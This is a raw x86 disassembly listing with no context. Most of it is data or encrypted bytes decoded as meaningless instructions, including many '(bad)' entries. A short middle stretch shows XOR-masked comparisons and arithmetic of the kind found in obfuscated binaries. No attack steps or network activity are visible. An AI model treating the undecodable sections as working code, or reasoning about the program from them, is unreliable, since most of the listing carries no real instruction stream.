  417d22:	mov    ds,WORD PTR [edi]
  417d24:	inc    ebp
  417d25:	gs xchg esp,eax
  417d27:	mov    dh,0xeb
  417d29:	pushf  
  417d2a:	xchg   edx,eax
  417d2b:	adc    eax,0xc0c0f4d7
  417d30:	cs mov esi,0x53fef881
  417d36:	jmp    0xfd7d:0x63f875b7
  417d3d:	mov    ebp,DWORD PTR [ebp-0x10]
  417d40:	mov    al,0x2b
  417d42:	loope  0x417d23
  417d44:	je     0x417d9b
  417d46:	ret    0x7b3f
  417d49:	xlat   BYTE PTR ds:[ebx]
  417d4a:	retf   0xaf89
  417d4d:	aam    0x6e
  417d4f:	aam    0xa1
  417d51:	in     eax,0xff
  417d53:	fldcw  WORD PTR [eax+edx*8]
  417d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d57:	and    DWORD PTR [ebp-0x1e496316],edx
  417d5d:	call   0x11912c84
  417d62:	mov    edi,0x6802377d
  417d67:	ret    0x7f9b
  417d6a:	push   es
  417d6b:	in     al,dx
  417d6c:	int3   
  417d6d:	dec    eax
  417d6e:	ins    DWORD PTR es:[edi],dx
  417d6f:	inc    edx
  417d70:	mov    al,0x97
  417d72:	lea    eax,[ecx-0x27]
  417d75:	jo     0x417db2
  417d77:	mov    ds:0x5175b668,eax
  417d7c:	inc    ebx
  417d7d:	ffreep st(6)
  417d7f:	mov    ecx,0x8885b5cc
  417d84:	jae    0x417ddb
  417d86:	xchg   edi,eax
  417d87:	inc    ebp
  417d88:	dec    esp
  417d89:	(bad)  
  417d8a:	les    esi,FWORD PTR [edi-0x507d48fd]
  417d90:	xor    eax,ebx
  417d92:	mov    edi,0x82bf697a
  417d97:	xor    ch,bh
  417d99:	mov    edx,eax
  417d9b:	out    dx,eax
  417d9c:	push   edx
  417d9d:	mov    ebp,DWORD PTR [eax]
  417d9f:	(bad)  
  417da1:	sbb    BYTE PTR [ebx-0x6c],ah
  417da4:	mov    es,WORD PTR [edi+ebx*4-0x67]
  417da8:	dec    esi
  417da9:	jle    0x417d9d
  417dab:	xchg   dx,ax
  417dad:	mov    bh,0x51
  417daf:	(bad)  
  417db0:	pop    edi
  417db1:	sub    DWORD PTR [ebp-0x60],0x49
  417db5:	ins    DWORD PTR es:[edi],dx
  417db6:	xor    DWORD PTR ds:0xfd03d57b,edx
  417dbc:	ficom  WORD PTR [eax-0x3b]
  417dbf:	mov    ecx,0x33e3741
  417dc4:	repz mov bl,0x1c
  417dc7:	ds jae 0x417e1c
  417dca:	lea    ebx,[esi+0x56]
  417dcd:	pmullw mm4,mm2
  417dd0:	jle    0x417db3
  417dd2:	and    al,0x3c
  417dd4:	call   0x51fb1ed2
  417dd9:	sti    
  417dda:	dec    edi
  417ddb:	adc    BYTE PTR ds:0x2ffb7038,dl
  417de1:	fild   WORD PTR [ecx+0x6db1c4d2]
  417de7:	mov    dh,0xa1
  417de9:	jb     0x417d87
  417deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dec:	clc    
  417ded:	mov    dh,BYTE PTR [edi+ebx*8+0x63]
  417df1:	aas    
  417df2:	xor    al,0xb8
  417df4:	dec    bp
  417df6:	xchg   ebx,eax
  417df7:	les    edi,FWORD PTR [eax]
  417df9:	mov    esi,0x54a9bcca
  417dfe:	iret   
  417dff:	pop    edi
  417e00:	inc    BYTE PTR [ecx-0x3e]
  417e03:	cmp    ch,ah
  417e05:	pop    ecx
  417e06:	imul   esp,esp,0x6e450f97
  417e0c:	mov    bl,dh
  417e0e:	xor    BYTE PTR [eax],bh
  417e10:	and    eax,0x9286dad3
  417e15:	inc    edx
  417e16:	jmp    0xa7d4eb7f
  417e1b:	add    ebp,DWORD PTR [ebx+0x554fa487]
  417e21:	lods   eax,DWORD PTR ds:[esi]
  417e22:	loopne 0x417e4e
  417e24:	outs   dx,BYTE PTR ds:[esi]
  417e25:	inc    esp
  417e26:	outs   dx,DWORD PTR ds:[esi]
  417e27:	fdivr  QWORD PTR [ebx-0x7fb8cc3c]
  417e2d:	pop    esp
  417e2e:	mov    esi,0x4b54b31a
  417e33:	(bad)  
  417e34:	pop    edx
  417e35:	into   
  417e36:	cmc    
  417e37:	cli    
  417e38:	xchg   BYTE PTR [eax],bl
  417e3a:	js     0x417e2f
  417e3c:	push   esp
  417e3d:	out    0x57,eax
  417e3f:	in     eax,dx
  417e40:	leave  
  417e41:	jecxz  0x417eb4
  417e43:	mov    bh,0xf6
  417e45:	pop    ebx
  417e46:	aaa    
  417e47:	push   esp
  417e48:	cmc    
  417e49:	(bad)  
  417e4a:	fisttp QWORD PTR [edi]
  417e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e4d:	repnz add ebx,DWORD PTR [ecx-0x6b2bdca]
  417e54:	je     0x417e97
  417e56:	mov    edx,0x9774004
  417e5b:	cwde   
  417e5c:	cmp    ebx,DWORD PTR [ebp+0x31a4b48d]
  417e62:	pop    es
  417e63:	jb     0x417e36
  417e65:	mov    cl,0x83
  417e67:	in     al,0xab
  417e69:	and    eax,0x8898cbc7
  417e6e:	call   0x9ecb:0xb272524f
  417e75:	test   cl,ah
  417e77:	jmp    0x417e4e
  417e79:	hlt    
  417e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e7b:	and    DWORD PTR [edx],0x2aa2be43
  417e81:	iret   
  417e82:	(bad)  
  417e83:	in     al,dx
  417e84:	pop    eax
  417e85:	add    BYTE PTR ss:[eax-0x25],ch
  417e89:	lock je 0x417e92
  417e8c:	inc    ecx
  417e8d:	or     ebx,DWORD PTR [eax+esi*8]
  417e90:	pop    ebp
  417e91:	sbb    BYTE PTR [ebp-0x1e9aa039],dh
  417e97:	ins    DWORD PTR es:[edi],dx
  417e98:	lods   al,BYTE PTR ds:[esi]
  417e99:	test   al,0x25
  417e9b:	pop    es
  417e9c:	and    ah,BYTE PTR ds:0x1d97409d
  417ea2:	push   esp
  417ea3:	leave  
  417ea4:	xor    BYTE PTR [ecx+0x506e0cbf],bl
  417eaa:	mov    edx,0xf2a59dd5
  417eaf:	out    dx,al
  417eb0:	xor    esi,edx
  417eb2:	dec    eax
  417eb3:	mov    eax,0xe12c7e38
  417eb8:	xchg   DWORD PTR [esi+0x73770a34],ecx
  417ebe:	daa    
  417ebf:	mov    bh,0x1e
  417ec1:	xchg   ebx,eax
  417ec2:	xor    edi,edx
  417ec4:	and    DWORD PTR [edx-0x1d],ebx
  417ec7:	jno    0x417e64
  417ec9:	clc    
  417eca:	or     dl,bh
  417ecc:	sar    BYTE PTR [edi],cl
  417ece:	(bad)  
  417ed0:	cmp    eax,0xe2877b44
  417ed5:	pop    ds
  417ed6:	adc    dh,dl
  417ed8:	addr16 aam 0x7e
  417edb:	add    BYTE PTR [edi+edi*8],bh
  417ede:	(bad)  
  417edf:	add    BYTE PTR [edi],bl
  417ee1:	jp     0x417f48
  417ee3:	mov    bh,0x19
  417ee5:	lahf   
  417ee6:	dec    esi
  417ee7:	ja     0x417eb5
  417ee9:	arpl   WORD PTR [ecx-0x37d1947a],cx
  417eef:	lods   al,BYTE PTR ds:[esi]
  417ef0:	sahf   
  417ef1:	adc    BYTE PTR [ebx],ah
  417ef3:	mov    esi,0xf5021fb
  417ef8:	pop    ebp
  417ef9:	xchg   edx,eax
  417efa:	mov    cl,0x9c
  417efc:	test   DWORD PTR [ecx+0x40ec2ba6],eax
  417f02:	mov    al,0x89
  417f04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f05:	cmp    eax,0x7bb56769
  417f0a:	jecxz  0x417f40
  417f0c:	or     eax,0x84c36578
  417f11:	mov    ds:0x2d3ab66b,al
  417f16:	mov    bh,0xc8
  417f18:	adc    al,0x9
  417f1a:	xchg   edx,eax
  417f1b:	nop
  417f1c:	cmp    al,0x62
  417f1e:	push   esi
  417f1f:	cs ja  0x417ec1
  417f22:	jno    0x417f4b
  417f24:	pop    ecx
  417f25:	fmul   DWORD PTR [ecx-0x4e]
  417f28:	loop   0x417ec9
  417f2a:	aad    0x2b
  417f2c:	out    dx,al
  417f2d:	jg     0x417f16
  417f2f:	call   esp
  417f31:	jb     0x417eea
  417f33:	push   eax
  417f34:	cmc    
  417f35:	jae    0x417f99
  417f37:	mov    ah,0xb5
  417f39:	cmp    eax,0x40334dba
  417f3e:	jge    0x417fb1
  417f40:	retf   
  417f41:	dec    edx
  417f42:	adc    eax,0xd1583e5e
  417f47:	mov    eax,ds:0x4ed28355
  417f4c:	push   0x348feeb4
  417f51:	fmul   QWORD PTR [edi+0x45]
  417f54:	or     BYTE PTR [edx],0x84
  417f57:	mov    edx,0x3aead99f
  417f5c:	sbb    al,0x67
  417f5e:	clc    
  417f5f:	sti    
  417f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f61:	mov    esp,0x4ec7bb40
  417f66:	imul   ebx,edx,0x52573d14
  417f6c:	xor    esi,DWORD PTR [edx]
  417f6e:	xor    BYTE PTR [esi-0x6f56b3a8],ch
  417f74:	call   0xfaf2:0x9705db09
  417f7b:	push   edx
  417f7c:	xchg   edx,eax
  417f7d:	ror    BYTE PTR [esi],1
  417f7f:	stos   BYTE PTR es:[edi],al
  417f80:	cmp    dh,dh
  417f82:	(bad)  
  417f83:	push   eax
  417f84:	push   es
  417f85:	pop    esp
  417f86:	jne    0x417f7a
  417f88:	pop    ebp
  417f89:	jge    0x417fa0
  417f8b:	dec    esp
  417f8c:	fsub   QWORD PTR [ebx-0x6d20b79d]
  417f92:	mov    ds:0xc7e67da7,eax
  417f97:	(bad)
  417f9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f9b:	stos   BYTE PTR es:[edi],al
  417f9c:	ret    0xc733
  417f9f:	inc    ebx
  417fa0:	xchg   edi,eax
  417fa1:	mov    ecx,0x2e98b484
  417fa6:	je     0x417fa1
  417fa8:	ins    BYTE PTR es:[edi],dx
  417fa9:	or     BYTE PTR [ebp-0x6b],bl
  417fac:	xchg   ebp,eax
  417fad:	inc    esp
  417fae:	or     eax,0xdbee300d
  417fb3:	(bad)  
  417fb4:	and    esp,DWORD PTR ds:0x5be84776
  417fba:	icebp  
  417fbb:	retf   
  417fbc:	mov    ch,0xb6
  417fbe:	inc    eax
  417fbf:	dec    ebp
  417fc0:	cld    
  417fc1:	iret   
  417fc2:	xor    al,0xb4
  417fc4:	imul   edi,DWORD PTR [ecx+0x56],0xfffffffc
  417fc8:	jecxz  0x417fec
  417fca:	xchg   ecx,eax
  417fcb:	mov    bh,0xab
  417fcd:	cmp    eax,0x48483342
  417fd2:	(bad)  
  417fd3:	jb     0x418032
  417fd5:	lock mov dh,0x95
  417fd8:	xchg   DWORD PTR [esi-0x6b],ebp
  417fdb:	mov    bh,BYTE PTR [ebp-0x52f7580a]
  417fe1:	fcom   QWORD PTR [eax]
  417fe3:	retf   0x5aa5
  417fe6:	xchg   ebx,eax
  417fe7:	dec    esi
  417fe8:	jns    0x417ff1
  417fea:	cdq    
  417feb:	xchg   ecx,eax
  417fec:	mov    ch,0xac
  417fee:	jle    0x41800b
  417ff0:	dec    edx
  417ff1:	aam    0xbb
  417ff3:	retf   0xe42d
  417ff6:	mov    ecx,0x5570f543
  417ffb:	in     al,0x12
  417ffd:	in     al,0x6
  417fff:	mov    esp,0x696e3ce4
  418004:	lea    edx,[edi]
  418006:	(bad)  
  418007:	cmp    al,BYTE PTR [esi*8+0x466111ae]
  41800e:	sti    
  41800f:	add    al,ch
  418011:	or     bh,BYTE PTR [ecx]
  418013:	xchg   ebp,eax
  418014:	fstp   TBYTE PTR [edx+edx*2-0x1b]
  418018:	jecxz  0x417fe3
  41801a:	inc    esi
  41801b:	mov    WORD PTR [esi+0x12],?
  41801e:	repnz pusha 
  418020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418021:	mov    edi,0xacf2a601
  418026:	ss push esi
  418028:	push   es
  418029:	das    
  41802a:	push   0xffffffeb
  41802c:	stc    
  41802d:	ret    
  41802e:	jl     0x418084
  418030:	sbb    ah,BYTE PTR [edi]
  418032:	lahf   
  418033:	jmp    0x4a6e:0x3b1a0d09
  41803a:	xlat   BYTE PTR ds:[ebx]
  41803b:	add    ecx,DWORD PTR [edi]
  41803d:	push   0x2e8a209a
  418042:	iret   
  418043:	(bad)  
  418044:	(bad)  
  418045:	sub    bl,BYTE PTR [edx]
  418047:	cmp    DWORD PTR [esi+0x35bcb617],esp
  41804d:	(bad)  
  41804e:	iret   
  41804f:	xchg   esp,eax
  418050:	dec    edx
  418051:	les    ecx,FWORD PTR [edx+eax*1+0x6e]
  418055:	stos   BYTE PTR es:[edi],al
  418056:	mov    eax,ds:0x6e740666
  41805b:	xchg   esi,eax
  41805c:	iret   
  41805d:	xchg   edi,eax
  41805e:	push   edi
  41805f:	inc    BYTE PTR [ebx-0x6853918c]
  418065:	jmp    0x6ba3:0x318aa931
  41806c:	pop    edx
  41806d:	inc    esp
  41806e:	jl     0x418082
  418070:	lods   al,BYTE PTR ds:[esi]
  418071:	sub    al,BYTE PTR [edx+0x7709845b]
  418077:	mov    ds:0x71291cf3,al
  41807c:	ret    
  41807d:	add    bh,al
  41807f:	jg     0x4180f3
  418081:	jbe    0x4180b3
  418083:	inc    esi
  418084:	inc    esp
  418085:	stos   DWORD PTR es:[edi],eax
  418086:	jb     0x41808d
  418088:	loope  0x418058
  41808a:	ror    BYTE PTR [edx-0x1e],0x2e
  41808e:	and    BYTE PTR [eax+0x4a],cl
  418091:	je     0x4180df
  418093:	jne    0x107fcce3
  418099:	pop    eax
  41809a:	adc    al,0x2e
  41809c:	fsub   DWORD PTR [ecx+0x14]
  41809f:	test   DWORD PTR [edi],edi
  4180a1:	sub    DWORD PTR [ecx],ebp
  4180a3:	inc    eax
  4180a4:	jg     0x4180b8
  4180a6:	sub    DWORD PTR [esi-0x6e529c9f],esp
  4180ac:	or     al,0xfc
  4180ae:	jb     0x41803c
  4180b0:	sbb    cl,dl
  4180b2:	das    
  4180b3:	fs jb  0x418125
  4180b6:	daa    
  4180b7:	(bad)  
  4180b8:	(bad)  [esi]
  4180ba:	test   BYTE PTR [edx+0x6e788da6],0x84
  4180c1:	mov    dl,0xc2
  4180c3:	fidivr WORD PTR [edi]
  4180c5:	jecxz  0x418126
  4180c7:	mov    eax,0x1ab078e0
  4180cc:	sub    DWORD PTR [ebx-0x5fb70bad],ecx
  4180d2:	lss    edx,FWORD PTR [esi-0xbd661f8]
  4180d9:	xlat   BYTE PTR ds:[ebx]
  4180da:	pop    es
  4180db:	test   ebx,ebx
  4180dd:	pop    ebp
  4180de:	sub    DWORD PTR [edx],esp
  4180e0:	jo     0x4180ab
  4180e2:	outs   dx,DWORD PTR ds:[esi]
  4180e3:	cld    
  4180e4:	mov    BYTE PTR [ebp+0x182313ff],ah
  4180ea:	pop    ebx
  4180eb:	add    bl,BYTE PTR [edi-0x71]
  4180ee:	daa    
  4180ef:	adc    DWORD PTR [eax-0x5759fa29],edi
  4180f5:	push   0xffffffc3
  4180f7:	xor    al,0x44
  4180f9:	popf   
  4180fa:	pop    eax
  4180fb:	repz (bad) 
  4180fe:	popa   
  4180ff:	and    BYTE PTR [ebx-0x62],bl
  418102:	add    al,0xf3
  418104:	xor    DWORD PTR [ecx+ecx*8+0x386202a4],esi
  41810b:	in     eax,0x59
  41810d:	shr    BYTE PTR [eax+0x3d],0x5c
  418111:	push   esp
  418112:	jl     0x4180aa
  418114:	cli    
  418115:	inc    edx
  418116:	(bad)  
  418119:	or     BYTE PTR [edi],ch
  41811b:	jle    0x418184
  41811d:	or     ch,BYTE PTR [ebp+0x5c]
  418120:	test   BYTE PTR [edi-0x51],cl
  418123:	cwde   
  418124:	inc    eax
  418125:	jb     0x41812b
  418127:	(bad)  
  418128:	sub    DWORD PTR [edi+0x3b],esi
  41812b:	pop    edx
  41812c:	mov    edi,0x8385b6a3
  418131:	(bad)  
  418132:	sti    
  418133:	dec    eax
  418134:	dec    esi
  418135:	xchg   esp,eax
  418136:	inc    ecx
  418137:	pop    eax
  418138:	cli    
  418139:	push   ebp
  41813a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41813b:	test   eax,0xe3774fbc
  418140:	mov    BYTE PTR [edi],cl
  418142:	jns    0x4181bf
  418144:	and    BYTE PTR [ebx-0x5ec77176],al
  41814a:	fxch   st(7)
  41814c:	mov    cl,0xba
  41814e:	push   0x846c3928
  418153:	hlt    
  418154:	dec    esp
  418155:	adc    DWORD PTR [eax+ebp*8+0x59],edi
  418159:	arpl   di,si
  41815b:	and    ch,ah
  41815d:	dec    ebp
  41815e:	fld    QWORD PTR [ecx+0x6d]
  418161:	popa   
  418162:	and    eax,0x87d8c108
  418167:	add    ebp,DWORD PTR ds:0x93f2bd41
  41816d:	fadd   st(1),st
  41816f:	stos   BYTE PTR es:[edi],al
  418170:	into   
  418171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418172:	ret    
  418173:	fwait
  418174:	lahf   
  418175:	inc    edx
  418176:	inc    ebx
  418177:	aaa    
  418178:	je     0x4181f6
  41817a:	ficom  WORD PTR [edx-0x74]
  41817d:	dec    esp
  41817e:	xor    al,0x46
  418180:	arpl   WORD PTR [esi+ebp*1-0x58],si
  418184:	ss pop edx
  418186:	jo     0x41811d
  418188:	popa   
  418189:	lods   eax,DWORD PTR ds:[esi]
  41818a:	outs   dx,DWORD PTR ds:[esi]
  41818b:	adc    BYTE PTR [eax+0x23885bdc],cl
  418191:	fsub   st(2),st
  418193:	out    dx,eax
  418194:	cli    
  418195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418196:	push   es
  418197:	xchg   ecx,eax
  418198:	ret    0x19e8
  41819b:	pop    esi
  41819c:	and    ecx,DWORD PTR [ebx-0x6b]
  41819f:	mov    bl,0xe6
  4181a1:	pop    edx
  4181a2:	loopne 0x41821e
  4181a4:	in     al,0x57
  4181a6:	fst    DWORD PTR [edx+eax*4]
  4181a9:	lahf   
  4181aa:	push   eax
  4181ab:	fcom   QWORD PTR [ecx-0x2d]
  4181ae:	dec    ebx
  4181af:	ins    DWORD PTR es:[edi],dx
  4181b0:	jae    0x418172
  4181b2:	xor    dl,BYTE PTR [ecx]
  4181b4:	mov    cl,0xde
  4181b6:	jo     0x4181f3
  4181b8:	out    0xa4,eax
  4181ba:	ficomp WORD PTR [esi+edx*4-0x73417ae8]
  4181c1:	shl    DWORD PTR [esi],cl
  4181c3:	out    dx,eax
  4181c4:	inc    edx
  4181c5:	and    ecx,DWORD PTR [eax+edx*1+0x6a]
  4181c9:	(bad)  
  4181ca:	call   0xd3f8:0xfc60b0c2
  4181d1:	push   edi
  4181d2:	add    DWORD PTR [ebx+0x5a04d239],esi
  4181d8:	data16 jo 0x4181d4
  4181db:	out    dx,eax
  4181dc:	mov    cl,0xa3
  4181de:	scas   al,BYTE PTR es:[edi]
  4181df:	cli    
  4181e0:	dec    ebx
  4181e1:	pop    edi
  4181e2:	push   es
  4181e3:	rcl    ah,0xab
  4181e6:	xor    DWORD PTR [ebx-0x76],esp
  4181e9:	jbe    0x418197
  4181eb:	mov    ebp,DWORD PTR [esi]
  4181ed:	dec    eax
  4181ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181ef:	xchg   ebx,eax
  4181f0:	mov    dh,0xeb
  4181f2:	int    0xd0
  4181f4:	repz sub eax,0x8f50b051
  4181fa:	aad    0xe1
  4181fc:	lods   al,BYTE PTR ds:[esi]
  4181fd:	push   0x57695c2a
  418202:	add    eax,0x35b31a56
  418207:	lods   al,BYTE PTR ds:[esi]
  418208:	xchg   ecx,eax
  418209:	mov    fs,WORD PTR [ebx-0x763b6593]
  41820f:	jb     0x41820e
  418211:	cmp    cl,al
  418213:	sub    cl,bl
  418215:	out    dx,eax
  418216:	getsec 
  418218:	and    ah,bl
  41821a:	repnz cdq 
  41821c:	and    ebx,esi
  41821e:	call   0xc13028c3
  418223:	nop
  418224:	mov    cl,0x2f
  418226:	aas    
  418227:	sbb    cl,dh
  418229:	test   eax,0x27f6994
  41822e:	cmc    
  41822f:	test   al,0x3c
  418231:	fxch   st(6)
  418233:	retf   0xd52d
  418236:	icebp  
  418237:	xchg   ebp,eax
  418238:	popa   
  418239:	enter  0xc204,0x44
  41823d:	xor    DWORD PTR [edi-0xa],esp
  418240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418241:	daa    
  418242:	xchg   cl,dh
  418244:	ins    DWORD PTR es:[edi],dx
  418245:	xchg   edi,eax
  418246:	aas    
  418247:	add    al,0xb5
  418249:	push   eax
  41824a:	les    esp,FWORD PTR [ebx]
  41824c:	addr16 xor eax,0x2f4ef37e
  418252:	cmp    DWORD PTR [eax],ebx
  418254:	ss ins BYTE PTR es:[edi],dx
  418256:	or     DWORD PTR [edi-0x26],ebp
  418259:	jmp    FWORD PTR [esi]
  41825b:	pusha  
  41825c:	not    DWORD PTR [ebx]
  41825e:	pop    edx
  41825f:	xlat   BYTE PTR ds:[ebx]
  418260:	xchg   BYTE PTR [ebp+0x78ab419a],dl
  418266:	cli    
  418267:	xor    eax,0x3236c590
  41826c:	test   BYTE PTR [eax],ch
  41826e:	pusha  
  41826f:	push   ss
  418270:	sti    
  418271:	xor    ecx,esp
  418273:	sbb    al,0xab
  418275:	into   
  418276:	jne    0x4182d7
  418278:	pop    edi
  418279:	test   edi,esp
  41827b:	loope  0x4182ec
  41827d:	ret    0xbd7e
  418280:	ins    DWORD PTR es:[edi],dx
  418281:	(bad)  
  418283:	sbb    DWORD PTR [esi-0x5b2b3244],esp
  418289:	push   ebx
  41828a:	sbb    DWORD PTR [eax+eax*1],ebx
  41828d:	jbe    0x4182f3
  41828f:	or     eax,0x7f347e26
  418294:	mov    ecx,0xc4f42f1a
  418299:	dec    ebp
  41829a:	pop    ebp
  41829b:	mov    dl,0x46
  41829d:	neg    BYTE PTR [esi-0x32]
  4182a0:	imul   esp,DWORD PTR [ecx-0x6fc4515d],0xa4fa0d6c
  4182aa:	sbb    BYTE PTR [edi+0x21226aa8],bh
  4182b0:	inc    ebx
  4182b1:	das    
  4182b2:	adc    dh,BYTE PTR [eax]
  4182b4:	fs jb  0x41826c
  4182b7:	movd   DWORD PTR [ecx+0x33fa5c55],mm2
  4182be:	add    BYTE PTR [ebx+0x5ff0ba5a],bl
  4182c4:	push   0xffffff84
  4182c6:	push   ebp
  4182c7:	(bad)  
  4182c8:	popa   
  4182c9:	repnz xchg ebp,eax
  4182cb:	push   ebx
  4182cc:	or     BYTE PTR [ecx-0x3c685bab],al
  4182d2:	pop    ebp
  4182d3:	mov    dh,0xe3
  4182d5:	sti    
  4182d6:	pop    ebx
  4182d7:	cmp    eax,0x62f9299f
  4182dc:	adc    dh,dh
  4182de:	fucom  st(7)
  4182e0:	out    dx,eax
  4182e1:	(bad)  
  4182e2:	js     0x418358
  4182e4:	mov    ds:0xea80ece6,eax
  4182ea:	adc    DWORD PTR [ebp-0x35a32fe6],ecx
  4182f0:	hlt    
  4182f1:	nop
  4182f2:	arpl   dx,bp
  4182f4:	inc    edx
  4182f5:	inc    edx
  4182f6:	push   cs
  4182f7:	adc    edi,edi
  4182f9:	ins    DWORD PTR es:[edi],dx
  4182fa:	jb     0x418317
  4182fc:	test   esi,0x67dbd836
  418302:	jp     0x4182ee
  418304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418305:	mov    ?,WORD PTR [ebx]
  418307:	out    dx,al
  418308:	xlat   BYTE PTR ds:[ebx]
  418309:	mov    al,ds:0x6d39045b
  41830e:	ffreep st(7)
  418310:	sub    bl,dh
  418312:	mov    WORD PTR gs:[ebp-0x6],fs
  418316:	mov    edx,0x5ddb110f
  41831b:	call   0x1db6:0xa0845fb3
  418322:	push   ebx
  418323:	xlat   BYTE PTR ds:[ebx]
  418324:	xchg   edi,eax
  418325:	mov    al,ds:0xb80282a8
  41832a:	push   cs
  41832b:	inc    eax
  41832c:	inc    ecx
  41832d:	ror    BYTE PTR [edi],0x9d
  418330:	pop    ebp
  418331:	jp     0x41834c
  418333:	mov    bh,0x7f
  418335:	mov    al,ds:0x509349ba
  41833a:	cli    
  41833b:	jae    0x41833e
  41833d:	push   ebx
  41833e:	or     BYTE PTR [esi-0x22],ah
  418341:	and    dl,BYTE PTR [edi+0x9]
  418344:	pop    ss
  418345:	fwait
  418346:	dec    ebx
  418347:	in     al,dx
  418348:	sar    BYTE PTR [ecx+0x3390f4c9],0x23
  41834f:	adc    al,0xe6
  418351:	cdq    
  418352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418353:	popa   
  418354:	sbb    bl,0xf3
  418357:	or     DWORD PTR [eax-0x744c856f],0x2d
  41835e:	xor    edx,DWORD PTR [edx+0x58]
  418361:	xchg   BYTE PTR [esi+edx*1],dl
  418364:	and    bh,BYTE PTR [esi+0x34]
  418367:	jle    0x41836f
  418369:	or     ebx,DWORD PTR ds:0x8906352
  41836f:	jmp    FWORD PTR [edi-0x51]
  418372:	ja     0x418327
  418374:	lods   al,BYTE PTR ds:[esi]
  418375:	fwait
  418376:	jle    0x418373
  418378:	mov    dh,0xce
  41837a:	shr    DWORD PTR [edx+ecx*1+0x188ef4c8],1
  418381:	xchg   edi,eax
  418382:	and    esp,DWORD PTR [ecx+0xc]
  418385:	inc    edx
  418386:	and    ecx,DWORD PTR [edi]
  418388:	test   ecx,esi
  41838a:	mov    eax,0x558bffff
  41838f:	hlt    
  418390:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418397:	mov    bl,BYTE PTR [ebp-0x1]
  41839a:	cmp    dl,bl
  41839c:	je     0x41a7c3
  4183a2:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183a5:	mov    edx,DWORD PTR [ebp-0xc]
  4183a8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4183af:	mov    ebx,DWORD PTR [ebp+0xc]
  4183b2:	xor    ecx,eax
  4183b4:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  4183bb:	jne    0x41cc40
  4183c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183c4:	mov    edx,DWORD PTR [ebp+0xc]
  4183c7:	xor    ecx,eax
  4183c9:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  4183d1:	mov    edx,DWORD PTR [ebp-0x18]
  4183d4:	xor    edx,eax
  4183d6:	add    edx,esi
  4183d8:	cmp    ecx,edx
  4183da:	mov    ecx,DWORD PTR [ebp-0x14]
  4183dd:	mov    DWORD PTR [ebp+0x8],ecx
  4183e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4183e3:	je     0x41cd48
  4183e9:	xor    ecx,eax
  4183eb:	add    ecx,esi
  4183ed:	mov    ecx,0x242ebe9
  4183f2:	je     0x41cb94
  4183f8:	mov    edx,DWORD PTR [ebp+0x8]
  4183fb:	mov    ebx,DWORD PTR [ebp-0x8]
  4183fe:	xor    edx,eax
  418400:	xor    ebx,eax
  418402:	sub    edx,ebx
  418404:	sub    edx,esi
  418406:	xor    edx,eax
  418408:	mov    DWORD PTR [ebp+0x8],edx
  41840b:	mov    edx,DWORD PTR [ebp+0x8]
  41840e:	mov    ebx,DWORD PTR [ebp-0x58]
  418411:	add    edx,0x5708c4
  418417:	imul   edx,ebx
  41841a:	mov    DWORD PTR [ebp-0x58],edx
  41841d:	mov    edx,DWORD PTR [ebp+0x8]
  418420:	mov    ebx,DWORD PTR [ebp-0x54]
  418423:	add    edx,0x64f8da
  418429:	or     edx,ebx
  41842b:	mov    DWORD PTR [ebp-0x54],edx
  41842e:	mov    edx,DWORD PTR [ebp+0x8]
  418431:	mov    ebx,DWORD PTR [ebp-0x50]
  418434:	add    edx,ecx
  418436:	xor    edx,ebx
  418438:	mov    DWORD PTR [ebp-0x50],edx
  41843b:	mov    edx,DWORD PTR [ebp+0x8]
  41843e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418441:	add    edx,edi
  418443:	and    edx,ebx
  418445:	mov    DWORD PTR [ebp-0x4c],edx
  418448:	mov    edx,DWORD PTR [ebp+0x8]
  41844b:	mov    ebx,DWORD PTR [ebp-0x48]
  41844e:	lea    edx,[ebx+edx*1+0x241fc1f]
  418455:	mov    DWORD PTR [ebp-0x48],edx
  418458:	mov    edx,DWORD PTR [ebp+0x8]
  41845b:	mov    ebx,0xfa5e15e2
  418460:	sub    ebx,edx
  418462:	add    ebx,DWORD PTR [ebp-0x44]
  418465:	mov    DWORD PTR [ebp-0x44],ebx
  418468:	mov    edx,DWORD PTR [ebp+0x8]
  41846b:	xor    edx,eax
  41846d:	add    edx,esi
  41846f:	jne    0x4183f8
  418475:	jmp    0x41cb94
  41847a:	jmp    0x41a7c3
  41847f:	adc    BYTE PTR [edi],cl
  418481:	lods   eax,DWORD PTR ds:[esi]
  418482:	fnsave [ebx-0x21]
  418485:	lock jae 0x41841c
  418488:	sbb    DWORD PTR [edx-0x4],ebx
  41848b:	inc    ebx
  41848c:	xchg   ebx,eax
  41848d:	sti    
  41848e:	jmp    0x41845c
  418490:	xor    BYTE PTR [ebp+0x7c],bh
  418493:	inc    eax
  418494:	pop    edi
  418495:	jl     0x418513
  418497:	jns    0x418481
  418499:	iret   
  41849a:	cli    
  41849b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41849c:	adc    ch,BYTE PTR [eax-0x25017511]
  4184a2:	push   0xa8805507
  4184a7:	sbb    al,0x43
  4184a9:	clc    
  4184aa:	mov    eax,ds:0x5a0ae1db
  4184af:	arpl   WORD PTR [esi+0x417551d0],bp
  4184b5:	add    eax,0x71b5848f
  4184ba:	jb     0x418453
  4184bc:	cdq    
  4184bd:	cmp    edi,DWORD PTR [edi]
